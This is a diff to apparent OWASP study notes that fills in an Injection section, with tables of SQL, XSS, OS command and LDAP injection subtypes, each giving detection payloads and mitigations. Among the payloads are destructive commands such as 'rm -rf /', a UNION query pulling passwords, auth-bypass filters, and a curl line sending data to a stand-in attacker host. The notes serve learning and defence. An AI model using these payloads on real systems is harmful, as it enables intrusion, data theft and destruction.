@@ -65,16 +65,60 @@
     - Cloud Key Management System (KMS): A cloud KMS service (like Google Cloud KMS, AWS KMS, or Azure Key Vault) provides a centralized and secure way to manage cryptographic keys.
 
 
-## A3 - 
-- **Core Concept** 
+## A3 - Injection
+- **Core Concept** Malicious data execution in interpreters (SQL, OS, etc.)
 - Process:
-    - 
-   
+    - Inject payloads input fields, Search boxs/APIs.
+    - Trigger unintended execution (e.g., database deletion).
 
-#### Finding - 
-   - **How to find**: 
+| Type | Payload Example | Target | Description | 
+|------------------------|-----------------------------------------|---------------------|--------|
+| SQL Injection | ' OR 1=1-- | Databases | Manipulating SQL queries to trick the database into retrieving confidential data |
+| XSS | ```<script>alert(1)</script>``` | User browsers | Injecting malicious scripts into web pages to be executed by other users' browsers. This can allow attackers to steal sensitive data, hijack sessions, or perform actions on the user's behalf |
+| OS Command | ; rm -rf / | Servers | Executing arbitrary operating system (OS) commands on a server through a vulnerable application. Attackers exploit applications that pass unsafe user-supplied data to a system shell |
+| LDAP Injection | ```*)(uid=*))(\|(uid=*``` | Directories | Manipulating Lightweight Directory Access Protocol (LDAP) queries to exploit vulnerabilities in directory services. This can allow attackers to bypass authentication, modify data, or execute arbitrary commands within the LDAP server |
+### SQL Injection
+| Subtype               | Definition                                                                 | Detection Method                                                                 | Mitigation                                                                 |
+|-----------------------|---------------------------------------------------------------------------|---------------------------------------------------------------------------------|----------------------------------------------------------------------------|
+| **Classic SQLi**      | Direct injection into SQL queries through user input.                      | Submit `' OR 1=1 --` in login forms; observe unexpected results.                | Use **parameterized queries** (Prepared Statements).                       |
+| **Blind SQLi**        | No direct errors; infer results via boolean or time delays.                | Test with `' AND 1=1 --` (true) vs. `' AND 1=2 --` (false). Time-based: `SLEEP(5)`. | Implement **input validation** and **Web Application Firewalls (WAFs)**.   |
+| **Union-Based SQLi**  | Uses `UNION` to combine queries and extract data.                          | Inject `' UNION SELECT username, password FROM users --`.                       | Disable error messages; use **ORM frameworks**.                            |
+| **Error-Based SQLi**  | Forces DB errors to leak schema/data.                                      | Trigger errors with `' AND 1=CONVERT(int,@@version) --`.                        | Configure DB to suppress detailed errors.                                  |
+| **Out-of-Band SQLi**  | Exfiltrates data via DNS/HTTP requests.                                    | Use tools like `Burp Collaborator` with `LOAD_FILE()` or `xp_dirtree`.          | Block outbound DB connections; sanitize inputs.                            |
 
-#### Mitigations -  
+### Cross-Site Scripting (XSS)
+| Subtype               | Definition                                                                 | Detection Method                                                                 | Mitigation                                                                 |
+|-----------------------|---------------------------------------------------------------------------|---------------------------------------------------------------------------------|----------------------------------------------------------------------------|
+| **Stored XSS**        | Malicious script stored on server (e.g., in comments).                     | Submit `<script>alert(1)</script>` in input fields; check persistence.          | Use **output encoding** (HTML Entity Encoding).                            |
+| **Reflected XSS**     | Script reflected in immediate response (e.g., search results).             | Test URL params: `?q=<script>alert(1)</script>`.                                | Implement **Content Security Policy (CSP)**.                               |
+| **DOM XSS**           | Client-side JS manipulates DOM unsafely.                                   | Analyze `document.write()` or `eval()` sinks in JS.                             | Avoid unsafe DOM APIs; use `textContent` over `innerHTML`.                 |
+| **Mutated XSS**       | Bypasses filters via obfuscation (e.g., `<img src=x onerror=alert(1)>`).   | Fuzz with polyglots like `jaVasCript:/*--></title></style></textarea></script>`.| Use **XSS filters** (e.g., DOMPurify).                                     |
+
+### OS Command Injection
+| Subtype               | Definition                                                                 | Detection Method                                                                 | Mitigation                                                                 |
+|-----------------------|---------------------------------------------------------------------------|---------------------------------------------------------------------------------|----------------------------------------------------------------------------|
+| **Classic Command Inj.** | Direct execution of OS commands via input (e.g., `; ls /etc`).            | Inject `; whoami` or `\|\| id` in input fields.                                 | Use **allowlist input validation**; avoid `system()` calls.                |
+| **Blind Command Inj.**  | No visible output; infer results via delays or out-of-band techniques.     | Test with `ping -c 5 127.0.0.1` (time delay) or `curl attacker.com?data=$(ls)`. | Implement **sandboxed execution** (e.g., containers).                      |
+| **Argument Injection**  | Manipulates command arguments (e.g., `tar --file=$(rm -rf /)`).            | Fuzz with `--version` or `$(sleep 5)`.                                          | Use **parameterized APIs** (e.g., `subprocess.run([cmd, arg1, arg2])`).    |
+
+
+### LDAP Injection
+| Subtype               | Definition                                                                 | Detection Method                                                                 | Mitigation                                                                 |
+|-----------------------|---------------------------------------------------------------------------|---------------------------------------------------------------------------------|----------------------------------------------------------------------------|
+| **Filter Injection**  | Modifies LDAP search filters (e.g., `(uid=*))(\|\|(cn=*))//`).             | Inject `*)(uid=*))(\|\|(1=0` to bypass auth.                                    | Use **LDAP parameterization** (e.g., `escapeDN()`).                        |
+| **Attribute Injection** | Injects malicious LDAP attributes (e.g., `admin=true`).                   | Test with `*)(objectClass=*))%00` to truncate filters.                          | Apply **input sanitization** for special chars (`*, (, ), \`, etc.).       |
+| **Booleanization**    | Uses LDAP boolean logic to leak data (e.g., `\|\|(mail=*@domain.com)`).    | Probe with `(cn=admin*)(sn=*))` to enumerate users.                             | Limit query results; enforce **access controls**.                          |
+#### Finding - Injection
+- Fuzz inputs with Burp Suite/SQLMap.
+- Test error messages for backend tech leaks.
+   - **How to find**: Use tools (sqlmap,Burp Suite), manual payloads, look for error messages.
+#### Mitigations -  Injection
+- Parameterized queries (Prepared Statement).
+    - Parameterized queries, also known as prepared statements, separate SQL code from user-supplied input. Instead of directly embedding user input into the query string, you use placeholders for the values. 
+-  Input validation with allowlists.
+    - Input validation is the process of checking user-supplied data to ensure it conforms to expected formats, types, and values. Using allowlists (or whitelists)
+- Output encoding for XSS.
+    - Output encoding transforms potentially harmful characters in user-supplied or untrusted data into a safe format before displaying it on a web page. This prevents the browser from interpreting the data as executable code (like JavaScript) and mitigates the risk of XSS attacks.
 
 ## A4 - 
 - **Core Concept** 
